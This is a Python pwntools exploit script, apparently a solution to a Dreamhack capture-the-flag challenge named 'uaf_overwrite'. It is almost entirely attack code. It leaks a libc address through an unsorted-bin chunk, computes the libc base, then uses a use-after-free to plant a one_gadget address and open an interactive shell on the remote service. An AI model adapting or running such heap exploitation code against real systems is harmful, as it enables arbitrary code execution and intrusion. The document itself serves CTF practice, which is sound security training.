#!/usr/bin/env python3

from pwn import *

exe = ELF("./uaf_overwrite_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("host1.dreamhack.games", 22295)

def custom(size, data, idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)
    p.sendlineafter(b'idx: ', str(idx))

def human(weight, age):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Weight: ', str(weight))
    p.sendlineafter(b'Age: ', str(age))

def robot(weight):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Weight: ', str(weight))

# input()

# Leak libc
# 0x420: unsorted bin -> leak libc
custom(0x420, b'a'*8, 1)

custom(0x300, b'a'*8, 0)

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'Size: ', str(0x420))
p.sendafter(b'Data: ', b'a'*8)
p.recvuntil(b'Data: ' + b'a'*8)
libc_leak = p.recvline()[:-1]
libc_leak = u64(libc_leak + b'\0\0')
print("Libc leak: " + hex(libc_leak))
p.sendlineafter(b'idx: ', str(9))
libc.address = libc_leak - 0x3ebca0
print("Libc base: " + hex(libc.address))

# Get shell
one_gadget = [0x4f3ce, 0x4f3d5, 0x4f432, 0x10a41c]

# UAF
human(10, one_gadget[3] + libc.address)
robot(10)

p.interactive()